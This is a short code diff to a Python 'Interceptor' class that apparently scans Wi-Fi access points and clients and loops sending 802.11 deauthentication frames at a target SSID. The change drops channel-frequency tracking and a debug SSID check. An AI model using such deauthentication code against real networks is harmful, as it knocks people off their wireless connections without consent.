@@ -66,9 +66,6 @@ class Interceptor:
                     return
                 if ssid not in self._active_aps:
                     self._active_aps[ssid] = self._init_ap_dict(ap_mac, self._current_channel_num)
-                    self._active_aps[ssid]["freq"] = pkt[RadioTap].Channel
-                    printf(f"[+] Found {ssid} on channel {self._current_channel_num}...")
-                if "Shpitz" in ssid:
                     printf(f"[+] Found {ssid} on channel {self._current_channel_num}...")
                 c_mac = str(pkt.addr1)
                 if c_mac != self._BROADCAST_MACADDR and c_mac not in self._active_aps[ssid]["clients"]:
@@ -161,7 +158,7 @@ class Interceptor:
         possible_ap_mac_addrs = [self._active_aps[self.target_ssid]["mac_addr"]]
         possible_ap_mac_addrs.extend(self._generate_possible_ap_mac_addrs())
         
-        rd_frm = RadioTap(Channel=self._active_aps[self.target_ssid]["freq"])
+        rd_frm = RadioTap()
         deauth_frm = Dot11Deauth()
         while not self._abort:
             self.attack_loop_count += 1
@@ -217,8 +214,7 @@ class Interceptor:
             "channel": ch,
             "mac_addr": mac_addr,
             "clients": list(),
-            "miss_counter": 0,  # when this reaches self.max_miss_cnt, remove
-            "freq": 0
+            "miss_counter": 0  # when this reaches self.max_miss_cnt, remove
         }
 
 
